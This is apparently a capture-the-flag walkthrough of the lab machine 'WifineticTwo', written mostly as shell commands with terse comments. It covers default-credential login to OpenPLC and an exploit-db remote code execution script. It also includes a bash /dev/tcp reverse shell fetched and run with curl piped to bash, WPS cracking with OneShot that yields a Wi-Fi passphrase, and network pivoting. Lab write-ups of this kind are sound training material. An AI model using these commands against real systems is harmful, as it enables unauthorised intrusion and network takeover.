## WifineticTwo 
```sh
nmap -p- -sV -sC --min-rate=100000 10.129.202.218
#found this: http://10.129.202.218:8080/login OpenPLC
# according to copilot this are the standard credentials Username: openplc Password: openplc
# that where working
#than i searched for an exploit and found one https://www.exploit-db.com/exploits/49803
rlwrap nc -lvnp 4444
python plc-expl.py -u http://10.129.202.218:8080 -l openplc -p openplc -i 10.10.14.190 -r 4444
#This doesnt worked 
# So the reason is that the blank_program.st is n running.
# I changed the programm from the exploit so that it overwrites the blank_program.st and suddenly i got a shell
# The exploit somehow created the shell correctly
# so to stabelize the shell i used this:
python3 -m http.server 8001
echo "/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.190/1338 0>&1'" > shell.sh
nc -lvnp 1338
#and on target server:
curl 10.10.14.190:8001/shell.sh|bash
# I was root but there was no root flag
# but 
find / -type f -iname "user.txt" 2>/dev/null
# delivered user flag
ifconfig # says there is wifi connected
iw wlan0 scan #scans the wifi
git clone https://github.com/kimocoder/OneShot
python3 oneshot.py -i wlan0 -b 02:00:00:00:01:00 #b is bssid from iw wlan0 scan
# WPS PIN: '12345670'
# WPA PSK: 'NoWWEDoKnowWhaTisReal123!'
#AP SSID: 'plcrouter'
wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!'> /tmp/config
wpa_supplicant -B -c /tmp/config -i wlan0
```
```sh
# i have to connect but my first tried crash the target box
# need to restart the target machine and redid the exploit
python plc-expl.py -u http://10.129.206.92:8080 -l openplc -p openplc -i 10.10.14.190 -r 4444
wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!'> /tmp/config
wpa_supplicant -B -c /tmp/config -i wlan0
ifconfig wlan0 192.168.1.7 netmask 255.255.255.0
#this conencts to the wifi
nmap -sn 192.168.1.0/24
```
```sh
# i have to connect again cause i crashed somehow the target box
python plc-expl.py -u http://10.129.176.215:8080 -l openplc -p openplc -i 10.10.14.190 -r 4444
wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!'> /tmp/config
wpa_supplicant -B -c /tmp/config -i wlan0
ifconfig wlan0 192.168.1.7 netmask 255.255.255.0
#this conencts to the wifi
ssh -tt -o StrictHostKeyChecking=no 192.168.1.1
```